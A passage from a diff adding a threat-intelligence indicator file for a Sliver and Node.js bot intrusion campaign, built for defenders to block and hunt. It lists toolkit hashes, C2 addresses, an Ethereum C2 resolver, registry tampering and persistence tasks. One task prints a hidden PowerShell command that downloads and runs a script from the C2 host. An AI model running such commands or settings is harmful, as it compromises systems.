+        "filename": "svcload.exe"
+      },
+      {
+        "value": "3d77fc5aaab483e67053b416da222ccc",
+        "filename": "da_shell_35.exe"
+      },
+      {
+        "value": "2e4fbb0e2472cb7a7e13cfc6fbb1905c",
+        "filename": "svcefs.exe"
+      },
+      {
+        "value": "4e52a44f01adf41d62bc8cae34dd788a",
+        "filename": "deploy2.cmd"
+      },
+      {
+        "value": "c9ab81d0e67295058636f951f7ce4e3a",
+        "filename": "inject_fs_v2.ps1"
+      },
+      {
+        "value": "8836546c46bf376ab009eb876bc3c793",
+        "filename": "ws36.exe"
+      },
+      {
+        "value": "d7359a6e562aa9c300c8af412f8f79ba",
+        "filename": "pb39_new.exe"
+      },
+      {
+        "value": "bd1eaea733425cd21a51a652c429951d",
+        "filename": "svchost_update.exe"
+      },
+      {
+        "value": "7517f2c1b04183224e73c54789cf37d5",
+        "filename": "gp_run.ps1"
+      },
+      {
+        "value": "ab31b24a0f7c4d23ebc1ee2ac0140d68",
+        "filename": "download_and_exec.ps1"
+      },
+      {
+        "value": "791883be0daf24cdd0a01483e8474173",
+        "filename": "gp.b64"
+      },
+      {
+        "value": "69b7f4ba9ce91a6e403270abcfd882ad",
+        "filename": "acl_enum.ps1"
+      },
+      {
+        "value": "986f1db25b7d9ca73b002fa28cf09346",
+        "filename": "chisel.exe"
+      },
+      {
+        "value": "7fb996df101d57a8a41507df380d4983",
+        "filename": "ligolo_agent.exe"
+      },
+      {
+        "value": "5dec764af6862185aa56d3d6bffa736f",
+        "filename": "svc37.exe"
+      },
+      {
+        "value": "f26c3cd4209492b699131d29b76d941a",
+        "filename": "chisel_new.exe"
+      },
+      {
+        "value": "7875a8100de57420cc403ebc530c6764",
+        "filename": "upd443.exe"
+      },
+      {
+        "value": "d3a4a2df6a7d4e92bfc5d0d78fd9cd1a",
+        "filename": "cons_c1.0.1.msi"
+      },
+      {
+        "value": "757c54783a367c7c490186fcf5bb35ce",
+        "filename": "dep4.bat"
+      },
+      {
+        "value": "0bae3972c232d6c174d5f68ced16319d",
+        "filename": "inject_sliver.ps1"
+      },
+      {
+        "value": "1a9880cc5cf5a9301377e1734d211c38",
+        "filename": "update.exe"
+      },
+      {
+        "value": "f66a37432cc8698eb693d2d4dc46d51e",
+        "filename": "task_39.ps1"
+      },
+      {
+        "value": "61973b73a6366f58c8e90118af3da7ee",
+        "filename": "dep2.ps1"
+      },
+      {
+        "value": "4b690f3ce585df982a042917b82642c8",
+        "filename": "slv_beacon_sc.bin"
+      },
+      {
+        "value": "a2baad151034951068e20dfdd742b36e",
+        "filename": "assa161_new.exe"
+      },
+      {
+        "value": "23a4301d524fccaef630e627fced1d94",
+        "filename": "task39_now.xml"
+      }
+    ],
+    "sha1": [
+      {
+        "value": "36fb8d4021e3c755830be0f66ebe74d0d2eb3a37",
+        "filename": "ccenum2.ps1"
+      },
+      {
+        "value": "668c40bb6c792b3502b4eefd0916febc8dbd5182",
+        "filename": "jp.exe"
+      },
+      {
+        "value": "eaca979848b1c2ff6df166ea199b3cb6b7cb1f15",
+        "filename": "ws_shell52500.exe"
+      },
+      {
+        "value": "67d42931f48c5af1227585df1143bcdd7f7c9eac",
+        "filename": "gp_reflect.ps1"
+      },
+      {
+        "value": "88ec2a71225a1749383953596b7cae43a34c02ec",
+        "filename": "nc64.exe"
+      },
+      {
+        "value": "7fb5c46a90fb27b53ccea1b6fec486baaf63266c",
+        "filename": "ms16032.ps1"
+      },
+      {
+        "value": "a2a8c85ae57521e1aa93d466b31096e217f4cd6f",
+        "filename": "efspot.exe"
+      },
+      {
+        "value": "e348c0567ef9a7aad7b4af3e1830f1a4c797bdcc",
+        "filename": "adduser.ps1"
+      },
+      {
+        "value": "f70f8c4bb655f3570d78b717cc9945182d59c814",
+        "filename": "add_dns_publisherres.ps1"
+      },
+      {
+        "value": "47183a554ea74f0bbd6271451e4a73bd41e9f362",
+        "filename": "add_publisherresolution.ps1"
+      },
+      {
+        "value": "8848b617942f71e87ab9c5e57d56550e9fb32e12",
+        "filename": "rragent.exe"
+      },
+      {
+        "value": "f0a955dc3c37a7da490b1b08a9b66b39abe6faf8",
+        "filename": "da_shell_36.exe"
+      },
+      {
+        "value": "c213a67fd8dc8e3f29857bdab83083459bb6ab75",
+        "filename": "dns_add_publisherres.ps1"
+      },
+      {
+        "value": "a5452c96f717af74228217db51a1b9e067b8c007",
+        "filename": "susan_task.b64"
+      },
+      {
+        "value": "8562d55255f9cd3dc36eb0e247cccd931d592249",
+        "filename": "inject_from_fs01.ps1"
+      },
+      {
+        "value": "2c8fd002f768ff6dc23b334f09c753f7f57af372",
+        "filename": "fix_uac.bat"
+      },
+      {
+        "value": "2cfa3a3bbdb24d66e974bbeff2582e309c0ff830",
+        "filename": "s.exe"
+      },
+      {
+        "value": "e702d3147f76f5bdc4afd140e33dc7e3975c79cb",
+        "filename": "pb161_new.exe"
+      },
+      {
+        "value": "fb49bdcc5cd75b8eb7784f16ce8504fee637b39c",
+        "filename": "ld.ps1"
+      },
+      {
+        "value": "ac819eaeac74f7cd8d39834ef3d1d1de399f03d0",
+        "filename": "webtitan_whitelist.ps1"
+      },
+      {
+        "value": "c78da3566bb7a63b66216c7649187bf81ff9d462",
+        "filename": "da_shell_12.exe"
+      },
+      {
+        "value": "4085fdd2fcfe3d722facf396990674dd14f80e67",
+        "filename": "ws37.exe"
+      },
+      {
+        "value": "5bf323cb53f3c67ba53ac04b0db264079dc5bc07",
+        "filename": "dep.ps1"
+      },
+      {
+        "value": "99b52013487a1b21e2031fffdbd9d5c7d5697a78",
+        "filename": "wt_whitelist.ps1"
+      },
+      {
+        "value": "ab485c551144fc3b6f9692d13182ae92c6fb9848",
+        "filename": "deploy.cmd"
+      },
+      {
+        "value": "b62cfa5cd03a0c4df831800f67291a93e981c883",
+        "filename": "task39_archive.xml"
+      },
+      {
+        "value": "a7f4141eaad1aa39594322b0b99dfca16c23390a",
+        "filename": "sys37.exe"
+      },
+      {
+        "value": "4b7de21331c0a4154a951dc68c4386154575a04c",
+        "filename": "ccenum.ps1"
+      },
+      {
+        "value": "595fe7c5c382d096cbc3f798a405fa1bdff380b7",
+        "filename": "getsys.exe"
+      },
+      {
+        "value": "d32956610c9959e6085eb3c968b089974802fab0",
+        "filename": "task39_past.xml"
+      },
+      {
+        "value": "e3b6ea8c46fa831cec6f235a5cf48b38a4ae8d69",
+        "filename": "mimi64.exe"
+      },
+      {
+        "value": "29a0233b8ad76c4afa58c3762a44494f06ef8805",
+        "filename": "wt_pg_whitelist.ps1"
+      },
+      {
+        "value": "5ce92796599966aa6f566f91fbb74a2e428abe08",
+        "filename": "ws35.exe"
+      },
+      {
+        "value": "9280c50bb26fd0cc28c7a761acef5fc742edaf74",
+        "filename": "deploy_all.bat"
+      },
+      {
+        "value": "c70038b39594531d3b5f56b3553800687e6b3a51",
+        "filename": "task39_exec.xml"
+      },
+      {
+        "value": "703e5dc305008e8d1e462a8404bdc31e28f71da2",
+        "filename": "run_chisel.bat"
+      },
+      {
+        "value": "a176fce8809d0d75f6fb02dfc237e35884881502",
+        "filename": "da_shell_39.exe"
+      },
+      {
+        "value": "33a09b40f8f3a647e2f1b26f075091e421e6419e",
+        "filename": "ws_3srv.exe"
+      },
+      {
+        "value": "a8ca03e0d328f9229db53a83620ee82db4eef873",
+        "filename": "task_useradd.xml"
+      },
+      {
+        "value": "db5e1ccaaa7ce6e73c67ea0fd037355205c8f361",
+        "filename": "dep3.bat"
+      },
+      {
+        "value": "4fee45e167d7e35710cfd2c3ff914851f830a427",
+        "filename": "s443tls.exe"
+      },
+      {
+        "value": "d2490257d18fd28f57eed637ceaf348fa21db1e4",
+        "filename": "dep8.bat"
+      },
+      {
+        "value": "188098b9caf3bc4d1b68dcad50d2e1cbd2e9d519",
+        "filename": "ps64.exe"
+      },
+      {
+        "value": "522e7674cd1f6ecd375166c3c1732414dbd64ce0",
+        "filename": "add_dns_from_37.ps1"
+      },
+      {
+        "value": "b3976255a0809b1985bb97a69deeb2cbb0644dfb",
+        "filename": "da_shell_37.exe"
+      },
+      {
+        "value": "6c280d0312ce01fecfc0447bc6b1073a5473ce65",
+        "filename": "arc39_new.exe"
+      },
+      {
+        "value": "35ca77675b5a406c4900caa93337020d07eeff46",
+        "filename": "ws_new31847.exe"
+      },
+      {
+        "value": "89b7e37d1c5c2c6bfbeb5e6978565910e998f237",
+        "filename": "task39.xml"
+      },
+      {
+        "value": "c0408da553d905857ac4f559b0438b99316f1bda",
+        "filename": "gp.exe"
+      },
+      {
+        "value": "2ac8c7101042720b11fe75bcb1a174ba9c07c3ac",
+        "filename": "da_shell_173.exe"
+      },
+      {
+        "value": "ca7854a3a4e24370b31991fc6f599e6b26f9065b",
+        "filename": "s443.exe"
+      },
+      {
+        "value": "56b91302fb68794db6bbebf320373fbbaa4cab2e",
+        "filename": "svcload.exe"
+      },
+      {
+        "value": "9cc91f37130b34354eab0a9af58cd4e81e2edd81",
+        "filename": "da_shell_35.exe"
+      },
+      {
+        "value": "7d97faf46b4da1fbb5e534df025b22ccf41d955a",
+        "filename": "svcefs.exe"
+      },
+      {
+        "value": "2e7efea9a0ecd10fcf5f6c3da70129a4e82c5430",
+        "filename": "deploy2.cmd"
+      },
+      {
+        "value": "6ae10f0e10e5f5d9a60be0f915e92c52c80d8e2b",
+        "filename": "inject_fs_v2.ps1"
+      },
+      {
+        "value": "54d18e7ee7502a343eab46fe8abcddc5815be062",
+        "filename": "ws36.exe"
+      },
+      {
+        "value": "b90fcdb8c9f3bb4620ec9d25bd8abc71033344e5",
+        "filename": "pb39_new.exe"
+      },
+      {
+        "value": "60285f6776cc3ff20872feeee7f2fd0b3b04410d",
+        "filename": "svchost_update.exe"
+      },
+      {
+        "value": "02d2f00766fa45b914a5b32d6677f36c916203a0",
+        "filename": "gp_run.ps1"
+      },
+      {
+        "value": "d87a33503d3a48ad52a83744a6c8e1255f572d66",
+        "filename": "download_and_exec.ps1"
+      },
+      {
+        "value": "5a0f26f2a01111d983862047072be7375d6b623d",
+        "filename": "gp.b64"
+      },
+      {
+        "value": "25805ac7956fd0e51ba59934fb9a49d766f89545",
+        "filename": "acl_enum.ps1"
+      },
+      {
+        "value": "0e7057a20a34462d03632c5550259a8959ed3149",
+        "filename": "chisel.exe"
+      },
+      {
+        "value": "12bc49435971a15c901ad71c7e0b15888098a480",
+        "filename": "ligolo_agent.exe"
+      },
+      {
+        "value": "90e66a19e668b77499b846ae10c58ef35117eed0",
+        "filename": "svc37.exe"
+      },
+      {
+        "value": "c787636df481e1075db49c96d696de8dc6198e26",
+        "filename": "chisel_new.exe"
+      },
+      {
+        "value": "60c2decd1de6b5651b91367803baf87e23279ecd",
+        "filename": "upd443.exe"
+      },
+      {
+        "value": "3b93437edbc45206932e9562431b1b362fcacbf2",
+        "filename": "cons_c1.0.1.msi"
+      },
+      {
+        "value": "68b939dc7e5b9071e3b7f8a376ca3210809143b8",
+        "filename": "dep4.bat"
+      },
+      {
+        "value": "2f35ddac6482f18fc997f2f39075c68b90ca7311",
+        "filename": "inject_sliver.ps1"
+      },
+      {
+        "value": "ad564329de735b1a29ad772bc5bd62ff720cc6b4",
+        "filename": "update.exe"
+      },
+      {
+        "value": "b1cf4359f0a6385d680c70bdeaec08aacd1cd286",
+        "filename": "task_39.ps1"
+      },
+      {
+        "value": "8d1ddc02460d80d50e13e5d5dadcfb192a6a2fab",
+        "filename": "dep2.ps1"
+      },
+      {
+        "value": "9dd99bc68e60132f32fc33617deb9583c8cebb51",
+        "filename": "slv_beacon_sc.bin"
+      },
+      {
+        "value": "42234e5190e0e25a2893797754864299983642c0",
+        "filename": "assa161_new.exe"
+      },
+      {
+        "value": "8a82195b031e322a8fd69da3e3e1b0f01dc1af36",
+        "filename": "task39_now.xml"
+      }
+    ]
+  },
+  "network_indicators": {
+    "ipv4": [
+      {
+        "value": "193.233.202.17",
+        "protocol": "TCP",
+        "purpose": "Primary C2 and staging host",
+        "asn": "AS203273 NetCrafters OU",
+        "netblock": "193.233.202.0/23",
+        "beacon_ports": [
+          443,
+          18743,
+          27342,
+          31847,
+          34291,
+          34827,
+          35292,
+          35293,
+          35294,
+          38571,
+          38572,
+          38927,
+          43815,
+          43816,
+          43817,
+          43891,
+          44561,
+          47832,
+          51203,
+          52174,
+          52500
+        ],
+        "staging_ports": [
+          80,
+          8080,
+          8088,
+          9001,
+          22673,
+          31337,
+          39287,
+          42099,
+          42718,
+          43156,
+          44321
+        ],
+        "first_seen": "2026-04-22",
+        "confidence": "DEFINITE",
+        "action": "BLOCK",
+        "false_positive_risk": false,
+        "context": "Confirmed dynamically as the beacon destination on both 80 and 443, and hardcoded in 22 recovered binaries. 15 of 90 engines malicious, reputation -12 as of 2026-09-06"
+      },
+      {
+        "value": "146.103.127.44",
+        "protocol": "TCP",
+        "purpose": "Secondary fallback C2, April 2026 only",
+        "asn": "AS216071 Servers Tech Fzco",
+        "beacon_ports": [
+          29153,
+          29154,
+          29155,
+          57824
+        ],
+        "confidence": "MODERATE",
+        "action": "MONITOR",
+        "false_positive_risk": true,
+        "false_positive_note": "The address was reassigned after the operator used it and the current occupant is unrelated. Treat as a historical indicator; blocking it today may affect a bystander tenant",
+        "context": "Hardcoded as second-tier fallback in six binaries and independently corroborated by relationship data on two of them"
+      },
+      {
+        "value": "38.110.228.125",
+        "protocol": "TCP",
+        "purpose": "A record for itemrange.com at time of analysis",
+        "asn": "AS174 Cogent Communications",
+        "confidence": "MODERATE",
+        "action": "MONITOR",
+        "false_positive_risk": true,
+        "false_positive_note": "The certificate presented on this address is for an unrelated domain, so co-tenancy is possible and was not measured",
+        "context": "Resolved destination of the blockchain-resolved C2 domain"
+      }
+    ],
+    "ipv6": [],
+    "domains": [
+      {
+        "value": "publisherresolution.com",
+        "confidence": "DEFINITE",
+        "action": "BLOCK",
+        "first_seen": "2026-04-01",
+        "false_positive_risk": false,
+        "context": "First value written to the Ethereum resolver contract at block 24783833. Also the domain the operator whitelisted through the victim's DNS filter and planted in internal DNS, which is what links the two campaign strands. 18 of 90 malicious"
+      },
+      {
+        "value": "resumeacceptable.com",
+        "confidence": "HIGH",
+        "action": "BLOCK",
+        "first_seen": "2026-04-28",
+        "false_positive_risk": false,
+        "context": "Contract C2 value set at block 24980089. 17 of 90 malicious"
+      },
+      {
+        "value": "simultaneouslypower.com",
+        "confidence": "HIGH",
+        "action": "BLOCK",
+        "first_seen": "2026-06-12",
+        "false_positive_risk": false,
+        "context": "Contract C2 value set at block 25302771. 18 of 90 malicious, reputation -11"
+      },
+      {
+        "value": "wiselystarting.com",
+        "confidence": "HIGH",
+        "action": "BLOCK",
+        "first_seen": "2026-06-18",
+        "false_positive_risk": false,
+        "context": "Contract C2 value set at block 25345369. 20 of 90 malicious, reputation -11"
+      },
+      {
+        "value": "itemrange.com",
+        "confidence": "HIGH",
+        "action": "BLOCK",
+        "first_seen": "2026-07-01",
+        "false_positive_risk": false,
+        "context": "Current contract C2 value, set at block 25437624. Registered 2026-07-01 with a machine-generated registrant organisation 8fc09420615ed80d. 21 of 90 malicious, reputation -11"
+      },
+      {
+        "value": "www.itemrange.com",
+        "confidence": "MODERATE",
+        "action": "BLOCK",
+        "false_positive_risk": false,
+        "context": "Subdomain of the current C2 domain"
+      }
+    ],
+    "urls": [
+      {
+        "value": "http://193.233.202.17:42718/task_39.ps1",
+        "confidence": "DEFINITE",
+        "action": "BLOCK",
+        "context": "Fileless weekly re-pull target of the capstone SYSTEM scheduled task"
+      },
+      {
+        "value": "http://193.233.202.17:42718/gp.b64",
+        "confidence": "DEFINITE",
+        "action": "BLOCK",
+        "context": "Base64 .NET assembly fetched for reflective in-memory loading"
+      },
+      {
+        "value": "http://193.233.202.17:42718/add_dns_from_37.ps1",
+        "confidence": "DEFINITE",
+        "action": "BLOCK",
+        "context": "Script staging on the same operator port"
+      },
+      {
+        "value": "http://193.233.202.17:8088/slv_beacon_sc.bin",
+        "confidence": "DEFINITE",
+        "action": "BLOCK",
+        "context": "Raw Sliver beacon shellcode fetched for in-memory injection, with the configured proxy explicitly bypassed"
+      },
+      {
+        "value": "http://193.233.202.17:42099/ws_new31847.exe",
+        "confidence": "DEFINITE",
+        "action": "BLOCK",
+        "context": "Implant staging for certutil-based mass deployment"
+      },
+      {
+        "value": "http://193.233.202.17:39287/cons_c1.0.1.msi",
+        "confidence": "DEFINITE",
+        "action": "BLOCK",
+        "context": "MSI staging for silent msiexec deployment"
+      },
+      {
+        "value": "http://193.233.202.17:44321/cons_c1.0.1.msi",
+        "confidence": "DEFINITE",
+        "action": "BLOCK",
+        "context": "The same MSI served on a second port, redundancy or rotation"
+      },
+      {
+        "value": "http://193.233.202.17:8080/",
+        "confidence": "DEFINITE",
+        "action": "BLOCK",
+        "context": "The open directory that served the 81-file toolkit"
+      },
+      {
+        "value": "http://193.233.202.17:8088/",
+        "confidence": "DEFINITE",
+        "action": "BLOCK",
+        "context": "The same directory served identically on a second port"
+      }
+    ],
+    "email_addresses": [],
+    "user_agents": [
+      {
+        "value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.6602.492 Safari/537.36",
+        "confidence": "HIGH",
+        "action": "HUNT",
+        "false_positive_risk": false,
+        "context": "Hardcoded in the Sliver implant profile and internally impossible: Chrome 108 stable builds are 108.0.5359.x, so the major version and build number contradict each other. Survives infrastructure rotation"
+      }
+    ],
+    "http_headers": [
+      {
+        "value": "X-Bot-Server",
+        "confidence": "HIGH",
+        "action": "HUNT",
+        "context": "Custom request header sent by the Node.js bot on every poll, carrying the resolved C2 URL"
+      }
+    ],
+    "uri_patterns": [
+      {
+        "value": "POST /{script|scripts|bundles|javascripts}(/...)*/{app.min.js|app.js|route.js|route.php|array.php|app.min.php}?<single letter>=<alphanumeric>",
+        "confidence": "HIGH",
+        "action": "HUNT",
+        "context": "Sliver HTTP transport decoy paths, regenerated per beacon. A POST to a static-asset-shaped path is the anomaly; real assets are fetched with GET. Path structure is a build-profile property and survives address rotation"
+      },
+      {
+        "value": "/api/<8 hex>/<uuid>/<8 hex>.{png|jpg|gif|css|ico|webp}?{id|token|key|b|q|s|v}=<build id>",
+        "confidence": "HIGH",
+        "action": "HUNT",
+        "context": "Node.js bot polling URL, designed to look like a static asset request"
+      },
+      {
+        "value": "/api/99331ff8/<bot id>",
+        "confidence": "HIGH",
+        "action": "HUNT",
+        "context": "Node.js bot re-obfuscation endpoint. The bot POSTs its own source here on first run and executes whatever comes back thereafter"
+      }
+    ],
+    "tls_certificates": [
+      {
+        "value": "35a3dfd53d1a8f73165747555ea264f815fde2d75fbbab0b6b513793cb39868b",
+        "hash_algorithm": "sha256",
+        "subject": "localhost",
+        "self_signed": true,
+        "valid_from": "2025-06-21",
+        "valid_to": "2028-06-20",
+        "confidence": "HIGH",
+        "action": "HUNT",
+        "context": "Presented on the primary C2 host"
+      }
+    ],
+    "jarm": [
+      {
+        "value": "3fd3fd20d00000021c43d43d00043d204204071741c36579e355f830d285a5",
+        "confidence": "MODERATE",
+        "action": "HUNT",
+        "false_positive_risk": true,
+        "false_positive_note": "No base rate measured. Use as a pivot aid, not as a detection indicator",
+        "context": "Primary C2 host"
+      },
+      {
+        "value": "2ad2ad16d2ad2ad0002ad2ad2ad2ad367956b0f7c241e0ae292cd63faf3f5e",
+        "confidence": "MODERATE",
+        "action": "HUNT",
+        "false_positive_risk": true,
+        "false_positive_note": "No base rate measured. Use as a pivot aid, not as a detection indicator",
+        "context": "Tertiary fallback C2 host"
+      }
+    ]
+  },
+  "blockchain_indicators": {
+    "chain": "Ethereum mainnet",
+    "resolver_contract": {
+      "value": "0xb3f2897f2bc797e5b9033faef8c81e92b01cb831",
+      "confidence": "DEFINITE",
+      "action": "HUNT",
+      "deployed": "2026-03-31T13:49:11Z",
+      "deployed_block": 24777993,
+      "context": "The Node.js bot reads its C2 address from this contract by eth_call across seven public RPC providers and takes a majority vote. The contract address is the campaign's most durable indicator: domains rotate every four to six weeks, and the contract address cannot change without redeploying to every victim. Polling it returns the next C2 the moment the operator sets it"
+    },
+    "storage_key": {
+      "value": "0x40b57c3622c1CbfD699207F71F2dE5A8Fe256893",
+      "confidence": "DEFINITE",
+      "context": "Address argument passed to the getter, and the only mapping key ever written across the contract's whole history"
+    },
+    "abi_selectors": [
+      {
+        "value": "0x7d434425",
+        "purpose": "C2 getter, someFunction(address) returns (string)",
+        "confidence": "DEFINITE"
+      },
+      {
+        "value": "0x7fcaf666",
+        "purpose": "setString(string), permissionless, writes to mapping[msg.sender]",
+        "confidence": "DEFINITE"
+      }
+    ],
+    "build_id": {
+      "value": "ff8fee46-5d21-4437-af5b-337434288cae",
+      "confidence": "DEFINITE",
+      "context": "Campaign or build identifier sent as the query-string value on every Node.js bot poll"
+    },
+    "c2_write_history": [
+      {
+        "nonce": 1,
+        "block": 24783833,
+        "timestamp": "2026-04-01T09:24:11Z",
+        "value": "https://publisherresolution.com"
+      },
+      {
+        "nonce": 2,
+        "block": 24980089,
+        "timestamp": "2026-04-28T17:35:11Z",
+        "value": "https://resumeacceptable.com"
+      },
+      {
+        "nonce": 3,
+        "block": 25302771,
+        "timestamp": "2026-06-12T17:06:35Z",
+        "value": "https://simultaneouslypower.com"
+      },
+      {
+        "nonce": 4,
+        "block": 25345369,
+        "timestamp": "2026-06-18T15:33:35Z",
+        "value": "https://wiselystarting.com"
+      },
+      {
+        "nonce": 5,
+        "block": 25437624,
+        "timestamp": "2026-07-01T12:19:59Z",
+        "value": "https://itemrange.com"
+      }
+    ],
+    "history_completeness": "Complete rather than a lower bound. The contract emits an event on every write, and enumeration returns exactly five writes from one address across the contract's entire lifetime"
+  },
+  "host_indicators": {
+    "registry_keys": [
+      {
+        "key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        "value_name": "WindowsHost",
+        "value_data": "conhost --headless \"<node.exe>\" \"<installdir>\\BDQbS2lZ6u.bak\"",
+        "value_type": "REG_SZ",
+        "confidence": "HIGH",
+        "context": "Node.js bot persistence. conhost --headless launches with no console window, quieter than windowsHide"
+      },
+      {
+        "key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
+        "value_name": "LocalAccountTokenFilterPolicy",
+        "value_data": "1",
+        "value_type": "REG_DWORD",
+        "confidence": "HIGH",
+        "context": "Enables remote administration using local administrator credentials"
+      },
+      {
+        "key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
+        "value_name": "EnableLUA",
+        "value_data": "0",
+        "value_type": "REG_DWORD",
+        "confidence": "HIGH",
+        "context": "Disables UAC system-wide"
+      },
+      {
+        "key": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa",
+        "value_name": "LocalAccountTokenFilterPolicy",
+        "value_data": "1",
+        "value_type": "REG_DWORD",
+        "confidence": "HIGH",
+        "context": "Written at SYSTEM by the reflectively loaded GodPotato assembly"
+      },
+      {
+        "key": "HKLM\\System\\CurrentControlSet\\Control\\Terminal Server",
+        "value_name": "fDenyTSConnections",
+        "value_data": "0",
+        "value_type": "REG_DWORD",
+        "confidence": "HIGH",
+        "context": "Enables RDP"
+      },
+      {
+        "key": "HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp",
+        "value_name": "UserAuthentication",
+        "value_data": "0",
+        "value_type": "REG_DWORD",
+        "confidence": "HIGH",
+        "context": "Disables Network Level Authentication, widening the pre-authentication surface on every host touched"
+      },
+      {
+        "key": "HKCU\\Software\\sZ918iBd\\K2WvqvNWIb",
+        "confidence": "HIGH",
+        "context": "MSI install-time registry writes under a per-build randomised key path. The path shape, not a specific value, is the indicator"
+      }
+    ],
+    "file_paths": [
+      "C:\\ProgramData\\upd.exe",
+      "C:\\ProgramData\\wsu.exe",
+      "C:\\ProgramData\\csvc.exe",
+      "C:\\ProgramData\\svchost_upd.exe",
+      "C:\\ProgramData\\nc64.exe",
+      "C:\\ProgramData\\chisel.exe",
+      "C:\\ProgramData\\add_dns.ps1",
+      "C:\\ProgramData\\sam39t.bak",
+      "C:\\ProgramData\\sys39t.bak",
+      "C:\\ProgramData\\sec39t.bak",
+      "C:\\Windows\\Tasks\\gp.b64",
+      "C:\\Windows\\Temp\\ls.dmp",
+      "C:\\Windows\\Temp\\cons_update.msi",
+      "C:\\Windows\\Temp\\cu.msi",
+      "C:\\Windows\\Temp\\ccen_out.txt",
+      "C:\\Windows\\Temp\\ccen2_out.txt",
+      "C:\\Windows\\Temp\\acl_out.txt",
+      "C:\\Windows\\Temp\\inj_out.txt",
+      "C:\\Windows\\Temp\\injfs_out.txt",
+      "C:\\Windows\\Temp\\injf_out.txt",
+      "%APPDATA%\\svchost.log",
+      "%APPDATA%\\.node_bot_id"
+    ],
+    "file_names": [
+      {
+        "value": "BDQbS2lZ6u.bak",
+        "confidence": "HIGH",
+        "context": "Node.js bot main script, launched from the Run key"
+      },
+      {
+        "value": "YUGKag9mvNKWylo.bin",
+        "confidence": "HIGH",
+        "context": "JavaScript decryptor and installer from the MSI cabinet"
+      },
+      {
+        "value": "jlfYWzAkN99jpGu.xml",
+        "confidence": "HIGH",
+        "context": "Encrypted bot payload, not XML despite the extension, entropy 7.97"
+      },
+      {
+        "value": "jEdb5ROX.cmd",
+        "confidence": "HIGH",
+        "context": "MSI CustomAction bootstrapper that fetches the Node runtime"
+      },
+      {
+        "value": "jfpcXP",
+        "confidence": "MODERATE",
+        "context": "Directory under %LOCALAPPDATA% renamed from node-v18.17.0-win-x64"
+      }
+    ],
+    "mutex_names": [],
+    "service_names": [],
+    "scheduled_tasks": [
+      {
+        "task_name": "WindowsUpdateSvc",
+        "action": "C:\\ProgramData\\ws_new31847.exe",
+        "trigger": "At startup",
+        "run_as": "SYSTEM",
+        "confidence": "HIGH",
+        "context": "Implant deployment task created remotely across an internal host list"
+      },
+      {
+        "task_name": "WindowsUpdSvc31",
+        "action": "C:\\ProgramData\\wsu.exe",
+        "trigger": "At startup",
+        "run_as": "SYSTEM",
+        "confidence": "HIGH",
+        "context": "Implant deployment task, four scripts create it"
+      },
+      {
+        "task_name": "WinSvcUpdate2",
+        "action": "msiexec /i C:\\Windows\\Temp\\cons_update.msi /quiet /norestart",
+        "trigger": "Once",
+        "run_as": "SYSTEM",
+        "confidence": "HIGH",
+        "context": "MSI deployment task"
+      },
+      {
+        "task_name": "SysUpdate",
+        "action": "msiexec /i <internal deployment share path> /quiet /norestart",
+        "trigger": "Once",
+        "run_as": "SYSTEM",
+        "confidence": "HIGH",
+        "context": "Remote task created over schtasks /s against a named workstation, then run immediately"
+      },
+      {
+        "task_name": "<weekly archiver task, description withheld as potentially victim-identifying>",
+        "action": "powershell -ep bypass -w hidden -NonInteractive -c iex((New-Object Net.WebClient).DownloadString('http://193.233.202.17:42718/task_39.ps1'))",
+        "trigger": "Weekly, DaysInterval 7",
+        "run_as": "SYSTEM",
+        "confidence": "DEFINITE",
+        "context": "The capstone persistence mechanism. Hidden, author forged to a domain administrator, and it re-pulls the full attack chain fresh from the C2 every run rather than executing a static payload"
+      }
+    ],
+    "named_pipes": [],
+    "msi_identifiers": [
+      {
+        "type": "ProductCode",
+        "value": "{5F77A6FE-5808-483E-BA61-624F7A865774}",
+        "confidence": "HIGH",
+        "context": "Randomised per build by the packager, so it identifies this build only"
+      },
+      {
+        "type": "UpgradeCode",
+        "value": "{B3D67F25-0E3A-4B6B-965C-2C7610958983}",
+        "confidence": "HIGH",
+        "false_positive_risk": true,
+        "false_positive_note": "Prevalence across unrelated samples is unmeasured, so this is NOT CHECKED as a link to other campaigns, not a weak one",
+        "context": "MSI semantics require the UpgradeCode to stay constant across versions of the same product, so unlike the randomised per-build values it is a candidate pivot to other packages from the same builder"
+      },
+      {
+        "type": "ProductName",
+        "value": "K2WvqvNWIb",
+        "confidence": "HIGH",
+        "context": "Randomised per build"
+      },
+      {
+        "type": "Manufacturer",
+        "value": "sZ918iBd",
+        "confidence": "HIGH",
+        "context": "Randomised per build"
+      }
+    ],
+    "imphashes": [
+      {
+        "value": "c2d457ad8ac36fc9f18d45bffcd450c2",
+        "confidence": "MODERATE",
+        "false_positive_risk": true,
+        "false_positive_note": "A shared imphash across Go binaries means a shared toolchain, not a shared program. Two members of this group are entirely different tools",
+        "context": "24 Group A files, Go 1.22.x, sizes 1.9 to 1.96 MB"
+      },
+      {
+        "value": "f34d5f2d4577ed6d9ceec516c1f5a744",
+        "confidence": "MODERATE",
+        "false_positive_risk": true,
+        "false_positive_note": "Two stock .NET Potato-family tools; the imphash reflects the managed loader stub, not this campaign",
+        "context": "The two x86 .NET assemblies in the kit"
+      }
+    ]
+  },
+  "behavioral_indicators": [
+    {
+      "pattern": "Outbound HTTP or TLS beacon on a fixed 60-second period with zero jitter",
+      "confidence": "DEFINITE",
+      "action": "HUNT",
+      "context": "Measured across eleven consecutive intervals. Survives every address, port and path rotation this operator performs, and needs no atomic indicator",
+      "type": "behavioral",
+      "value": "Outbound HTTP or TLS beacon on a fixed 60-second period with zero jitter"
+    },
+    {
+      "pattern": "Paired connections to ports 80 and 443 on the same destination within one second, from consecutive ephemeral source ports",
+      "confidence": "HIGH",
+      "action": "HUNT",
+      "context": "The dual-channel beacon signature",
+      "type": "behavioral",
+      "value": "Paired connections to ports 80 and 443 on the same destination within one second, from consecutive ephemeral source ports"
+    },
+    {
+      "pattern": "HTTP POST to a path ending .js, .php or an image extension with a one-character query parameter",
+      "confidence": "HIGH",
+      "action": "HUNT",
+      "context": "Static assets are fetched with GET, so a POST to such a path is the anomaly",
+      "type": "behavioral",
+      "value": "HTTP POST to a path ending .js, .php or an image extension with a one-character query parameter"
+    },
+    {
